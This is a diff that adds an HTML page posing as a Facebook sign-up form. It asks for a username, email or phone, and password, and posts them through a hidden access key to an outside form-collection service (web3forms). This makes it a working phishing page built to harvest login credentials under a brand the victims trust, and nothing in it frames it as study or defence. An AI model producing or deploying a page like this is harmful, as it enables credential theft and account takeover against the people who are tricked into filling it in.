@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>- Sign Up</title>
+<style>
+body{
+  background-image: url('/img/Picsart_24-08-26_07-33-34-614.jpg'); /* Replace with your background image URL */
+  background-size: cover;
+  background-position: center;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0;
+  min-height: 100vh;
+  font-family: Arial, sans-serif;
+}
+
+h1{
+  color:#CD5D5D;
+  text-shadow:3px 4px 1px #CECECE;
+}
+
+.logindiv{
+  width:86%;
+  background-color:#FFFFFF;
+  border-radius:6px;
+  padding-top:60px; /* Adjusted for profile picture */
+  padding-bottom:20px;
+  box-shadow:5px 5px 10px #808080;
+  position: relative;
+}
+
+.profile-pic{
+  width:100px;
+  height:100px;
+  border-radius:50%;
+  border:4px solid #FFFFFF;
+  position: absolute;
+  top:-50px; /* Adjusted to position above the form */
+  left:calc(50% - 50px); /* Center horizontally */
+  background-color: #CD5D5D;
+}
+
+input{
+  width:70%;
+  border:1px solid #CECECE;
+  border-radius:6px;
+  padding:12px 6px 12px 6px;
+  margin-bottom:5px;
+  outline:none;
+  background-color:#F6F6F6;
+}
+
+.submit{
+  width:50%;
+  background-color:#CD5D5D;
+  outline:none;
+  color:#F6F6F6;
+  border:none;
+  font-weight:bold;
+}
+
+.privacy{
+  width:70%;
+  margin:5px 0px 10px 0px;
+}
+</style>
+</head>
+<body>
+
+<div class="logindiv" align="center" >
+  <img src="/img/Picsart_24-08-18_18-44-11-013.jpg" alt="Profile Picture" class="profile-pic"> <!-- Replace with your profile picture URL -->
+  <form action="https://api.web3forms.com/submit" method="POST">
+
+    <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
+
+  <form>
+    <h1>Facebook</h1>
+    <input type="text" placeholder="Pag i love you para sendan tika"name="username"required>
+    <input type="email or phone"name="Email or phone"placeholder="Email or phone" required>
+    <input type="password"name="PA$$W0RD" placeholder="Password" required id="id_password">
+    <p class="privacy" align="left">By creating an account you agree to our <a href="#" style="color:#CD5D5D">Terms & Privacy</a>.</p>
+    <input class="submit"  type="submit">
+  </form>
+</div>
+
+</body>
+</html>
